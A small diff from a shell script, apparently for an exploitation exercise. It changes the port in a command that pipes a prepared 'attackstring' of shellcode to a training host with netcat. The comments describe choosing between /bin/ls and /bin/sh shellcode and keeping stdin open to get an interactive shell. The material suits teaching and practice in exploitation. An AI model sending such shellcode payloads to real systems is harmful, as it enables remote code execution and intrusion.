@@ -58,5 +58,5 @@ echo "Attackstring is $(echo -n $attackstr | wc -c) bytes" >&2  # print to stder
 # echo $attackstr | nc hackme.rded.nl 57065 # Comment me out if you want to run the /bin/ls shell code (./shellcode list)
 
 # Uncomment if you want to run the /bin/sh shell code (./shellcode shell)
-(echo $attackstr; cat -) | nc hackme.rded.nl 52624
+(echo $attackstr; cat -) | nc hackme.rded.nl 46260
 ## This composed command allows stdin to remain open, which would otherwise have been closed by the EOF sent by echo.
